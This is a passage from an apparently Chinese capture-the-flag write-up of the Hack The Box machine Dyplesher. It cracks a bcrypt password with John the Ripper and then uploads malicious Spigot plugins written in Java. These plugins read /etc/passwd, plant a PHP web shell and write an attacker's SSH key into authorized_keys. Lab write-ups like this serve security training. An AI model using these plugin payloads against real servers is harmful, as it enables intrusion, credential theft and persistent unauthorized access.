    |   |   `-- 86
    |   |       `-- 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle
    |   `-- d4
    |       `-- 73
    |           `-- d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle
    `-- d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35
        |-- LICENSE.txt
        |-- README.md
        `-- nightminer.py
    26 directories, 54 files
可以看到在`4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity`下有一个名为`users.db`的数据库文件。
用file命令查看发现是sqlite数据库文件：
    ╭─kali@kali ~/repositories/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity ‹master› 
    ╰─$ file users.db
    users.db: SQLite 3.x database, last written using SQLite version 3027002
`.tables`命令查看数据表信息：
    ╭─kali@kali ~/repositories/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity ‹master› 
    ╰─$ sqlite3 users.db
    SQLite version 3.33.0 2020-08-14 13:23:32
    Enter ".help" for usage hints.
    sqlite> .tables
    users
设置`.header on`显示表头，不然会看得比较懵：
    sqlite> .header on
    sqlite> select * from users;
    unique_user_id|password|encryption|ip
    18fb40a5c8d34f249bb8a689914fcac3|$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6|7|/192.168.43.81
有一串加密密码，利用john the ripper解密，得到`alexis1`：
    ╭─kali@kali ~ 
    ╰─$ cat hash
    $2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6
    ╭─kali@kali ~ 
    ╰─$ john hash --wordlist=/root/htb-tools/wordlists/rockyou.txt    
    Using default input encoding: UTF-8
    Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
    Cost 1 (iteration count) is 1024 for all loaded hashes
    Press 'q' or Ctrl-C to abort, almost any other key for status
    alexis1          (?)
    1g 0:00:00:56 DONE (2020-11-05 08:08) 0.01768g/s 28.06p/s 28.06c/s 28.06C/s alexis1..cameron1
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed
利用这个密码`[PI:EMAIL](mailto:PI:EMAIL) : alexis1`登录
 :
左边的toolbar上有一些链接。
Console – `/home/console`：
console界面上提示， **Running Paper MC** ，Paper MC
fork自Spigot，主要是修复Spigot的一些不足之处，Spigot是运行MineCraft服务器的一个软件，他跟官方出的服务器软件不一样的地方在于它可以为服务器装上一些插件，而且稳定性和负载性也比较好，同时也支持多服务器串联，现在的百人服务器也基本都是使用它来架设的。
Reload Plugin – `/home/reload` ：
加载/卸载用户自定义的插件。
Add Plugin – `/home/add`：
上传用户插件，上传的用户需要通过reload来激活。
Delete Plugin – `/home/delete`：
删除插件，但其实删不掉，不过我们可以查看当前正在运行的插件情况。
###  制作MineCraft插件
先简要介绍下这个插件框架啥的。
既然felamos拥有上传插件和加载插件的权限，所以我们可以自己制作一些插件来运行系统命令，插件制作教程可以参考这篇文章[Creating a plugin
with Maven using IntelliJ IDEA](https://www.spigotmc.org/wiki/creating-a-plugin-with-maven-using-intellij-idea/)。
制作插件需要：
  * Intellij IDEA
  * JDK，在之前的/root/repositories/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce目录下，有个craftbukkit-1.8.jar，查看MANIFEST.MF文件就知道当前的jdk版本是1.8。
    ╭─root@vultr ~/repositories/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce ‹master*› 
    ╰─$ ls  
    README.md            bukkit.yml           eula.txt  permissions.yml  sc-mqtt.jar        start.command   world
    banned-ips.json      commands.yml         help.yml  plugins          server.properties  usercache.json  world_the_end
    banned-players.json  craftbukkit-1.8.jar  ops.json  python           spigot-1.8.jar     whitelist.json
####  Step 1
`File -> New -> Project`，新建项目，选择`Maven`，jdk版本选择1.8：
然后填写GroupId和ArtifactId，也就是项目名：
####  Step 2
新建好项目后，首先修改pom.xml文件来添加一些必要的依赖组件。因为要制作一个Spigot插件并且使用相关的API，通过修改pom.xml来引入这些包：
                spigot-repo
                https://hub.spigotmc.org/nexus/content/repositories/snapshots/
                org.spigotmc
                spigot-api
                1.16.2-R0.1-SNAPSHOT
                provided
右下角弹出提示需要导入这些依赖包，点击`Import Changes`，IDEA会开始进行下载：
####  Step 3
然后在左侧的文件夹`mineplug -> src -> main -> java`，右键新建一个包`java -> New ->
Package`，包名是你的GroupId +
plugin名，我这里就是`htb.dyplesher.mineplug`。然后在该package下新建一个Class，`New -> Class`
。在编写插件时需要先引入必要的包，`import
org.bukkit.plugin.java.JavaPlugin`，先利用两个方法`onEnable()`和`onDisable()`进行测试：
    package htb.dyplesher.mineplug;
    import org.bukkit.plugin.java.JavaPlugin;
    public class mineplug extends JavaPlugin {
        @Override
        public void onEnable() {
            getLogger().info("onEnable is called!");
        }
        @Override
        public void onDisable() {
            getLogger().info("onDisable is called!");
        }
    }
####  Step 4
然后需要将其打包成jar包，首先右键`src -> main -> resources`，新建`plugin.yml`文件，填入plugin的相关信息：
    name: mineplug
    version: 1.0
    main: htb.dyplesher.mineplug.mineplug
项目的目录结构：
在IDEA的最右侧隐藏栏上，选择`Maven Projects -> mineplug -> Lifecycle`，右键`package -> Run
Maven Build`，生成的jar包在target文件夹下。
###  上传插件
然后将其通过`/home/add`上传到服务器上：
通过`/home/reload`，输入插件名mineplug来激活：
在Console处可以看到被激活的插件：
选择unload可以卸载相应的插件：
###  任意文件读取
既然上传的jar包可以被运行，就意味着可以利用它来执行一些系统命令或是读取一些敏感文件：
    package htb.dyplesher.mineplug;
    import org.bukkit.plugin.java.JavaPlugin;
    import java.io.BufferedReader;
    import java.io.FileReader;
    import java.io.IOException;
    public class mineplug extends JavaPlugin {
        @Override
        public void onEnable() {
            getLogger().info("onEnable is called!");
            try {
                String Line;
                BufferedReader br = new BufferedReader(new FileReader("/etc/passwd"));
                while ((Line = br.readLine()) != null) {
                    getLogger().info(Line);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        @Override
        public void onDisable() {
            getLogger().info("onDisable is called!");
        }
    }
在Console里就打印出了服务器上/etc/passwd文件的内容：
## 上传shell
写入shell：
    package htb.dyplesher.shellplug;
    import org.bukkit.plugin.java.JavaPlugin;
    import java.io.FileWriter;
    public class shellplug extends JavaPlugin {
        @Override
        public void onEnable() {
            getLogger().info("onEnable is called!");
            try {
                FileWriter fw = new FileWriter("/var/www/test/cmd.php");
                fw.write("");
                fw.close();
            } catch (Exception e) {
                getLogger().info(e.toString());
            }
        }
        @Override
        public void onDisable() {
            getLogger().info("onDisable is called!");
        }
    }
访问  :
当前的用户为MinatoTW，看看`/home/MinatoTW`下有什么，cmd.php?0=ls%20-al%20/home/MinatoTW ：
发现`.ssh`目录，在目录下有`authorized_keys`，那只要上传我们自己的公钥就可以免密登录了：
我本机的`.ssh`目录下没有ssh密钥，所以先执行ssh-keygen创建密钥对：
    ssh-keygen -t rsa -b 4096
创建后目录下会多出两个文件`id_rsa`和`id_rsa.pub`，前者是私钥，后者是公钥：
我们需要将公钥写入到目标主机的`authorized_keys`文件中，就能实现免密登录：
    package htb.dyplesher.sshplugin;
    import java.io.BufferedReader;
    import java.io.FileWriter;
    import org.bukkit.Bukkit;
    import org.bukkit.plugin.java.JavaPlugin;
    public class sshplugin extends JavaPlugin {
        @Override
        public void onEnable() {
            getLogger().info("onEnable is called!");
            try {
                FileWriter fw = new FileWriter("/home/MinatoTW/.ssh/authorized_keys");
                fw.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCu/ObL6IdSkC6UU2xkZR3frEofJxER7tnjG59fa2Zk98m1Ib/[......]/e01IYwqeAFXhW4wvezG/Icbf2iuTOHggEdnHsBDBL/upYw== kali@kali");
                fw.close();
                getLogger().info("Successfully wrote to the file");
            } catch (Exception e) {
                getLogger().info(e.toString());
            }
        }
        @Override
        public void onDisable() {
            getLogger().info("onDisable is called!");
        }
    }
上传插件并加载后，登录成功：
登录后，在`/home/MinatoT`目录下有三个文件夹：
    MinatoTW@dyplesher:~$ ls
    backup  Cuberite  paper
    MinatoTW@dyplesher:~$ ls -alt
    total 64
    drwx------  2 MinatoTW MinatoTW 4096 May 20 13:45 .ssh
    drwxr-xr-x 10 MinatoTW MinatoTW 4096 May 20 13:41 .
    drwx------  2 MinatoTW MinatoTW 4096 Apr 23  2020 .cache
    drwx------  3 MinatoTW MinatoTW 4096 Apr 23  2020 .gnupg
    -rw-------  1 MinatoTW MinatoTW  802 Apr 23  2020 .viminfo
    drwxrwxr-x 11 MinatoTW MinatoTW 4096 Apr 23  2020 Cuberite
    lrwxrwxrwx  1 root     root        9 Apr 23  2020 .bash_history -> /dev/null
    drwxr-xr-x  6 root     root     4096 Apr 23  2020 ..